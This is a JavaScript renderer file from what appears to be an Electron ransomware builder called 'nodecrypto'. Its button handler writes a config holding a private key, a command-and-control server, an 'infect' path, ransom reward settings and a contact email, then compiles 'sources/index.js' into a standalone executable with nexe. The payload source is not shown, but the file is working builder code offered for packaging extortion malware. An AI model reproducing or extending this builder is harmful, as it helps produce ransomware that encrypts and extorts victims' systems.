// This file is required by the index.html file and will
// be executed in the renderer process for that window.
// No Node.js APIs are available in this process because
// `nodeIntegration` is turned off. Use `preload.js` to
// selectively enable features needed in the rendering
// process.
var $ = require("jquery");

$("#runCompile").click(function(){
	/* const system = require('system-commands')

	system('node compil.js').then(output => {
		console.log(output);
		return;	
	}).catch(error => {
		console.error(error)
	}) */

	var writeJson = require('write-json'); 
	writeJson.sync('nodecrypto-config.js', {privateKey: $("#PrivateKey").val(), serverCC: $("#serverCC").val(), websitePath: $("#infectPath").val(), openReward: $("#openReward").val(), rewardUrl: $("#rewardUrl").val(), contactMail: $("#contactMail").val()});

	const { compile } = require('nexe')

	var run = compile({
	  input: 'sources/index.js',
	  output: 'sources/output',
	  resources: "nodecrypto-config.js",
	  loglevel: 'verbose'
	}).then(() => {
	  console.log('success')
	})
	 console.log(run)
});
